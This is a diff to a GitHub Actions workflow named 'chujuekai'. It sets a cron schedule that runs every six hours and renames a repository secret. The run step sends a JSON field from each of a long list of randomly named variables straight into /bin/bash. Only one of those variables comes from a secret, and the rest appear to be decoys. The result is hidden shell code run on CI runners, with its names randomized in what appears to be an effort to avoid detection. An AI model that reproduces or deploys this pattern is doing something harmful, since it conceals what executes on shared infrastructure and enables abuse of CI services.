@@ -1,10 +1,8 @@
 name: chujuekai
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
-
+    - cron: '2 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,17 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: chujuekai
         env:
-          tbd21835: ${{ secrets.tbd21835 }}
+          eulc06290: ${{ secrets.eulc06290 }}
         run: |
-          echo $tbd21835 | jq -r .ywki47 | /bin/bash
-          echo $cpoo629 | jq -r .ml8 | /bin/bash
-          echo $p49071 | jq -r .udlgx50391 | /bin/bash
-          echo $ga32688 | jq -r .tga80638 | /bin/bash
-          echo $s24 | jq -r .gzrcj5 | /bin/bash
-          echo $couoe9489 | jq -r .borsm70617 | /bin/bash
-          echo $bzz77634 | jq -r .j759 | /bin/bash
-          echo $l3 | jq -r .nps067 | /bin/bash
-          echo $i2432 | jq -r .m523 | /bin/bash
-          echo $stasz17835 | jq -r .gis03 | /bin/bash
-          echo $eip0 | jq -r .hufif155 | /bin/bash
+          echo $eulc06290 | jq -r .esmfw0191 | /bin/bash
+          echo $q24 | jq -r .cbck1 | /bin/bash
+          echo $ues3 | jq -r .ehwhw101 | /bin/bash
+          echo $dci36 | jq -r .ucrv47 | /bin/bash
+          echo $hw172 | jq -r .ci160 | /bin/bash
+          echo $ef50793 | jq -r .iygm81 | /bin/bash
+          echo $kzdeb4 | jq -r .h153 | /bin/bash
+          echo $vvypy2 | jq -r .ri5679 | /bin/bash
+          echo $qqdjk60 | jq -r .v5 | /bin/bash
+          echo $e4159 | jq -r .tdjw3 | /bin/bash
+          echo $gvadi7163 | jq -r .lxqxv9273 | /bin/bash
+          echo $gdyyh9381 | jq -r .indn10116 | /bin/bash
+          echo $m97910 | jq -r .hjbx7527 | /bin/bash
+          echo $gugg14 | jq -r .eec45637 | /bin/bash
+          echo $qv4455 | jq -r .ji6658 | /bin/bash
+          echo $qa595 | jq -r .izhi77936 | /bin/bash
 
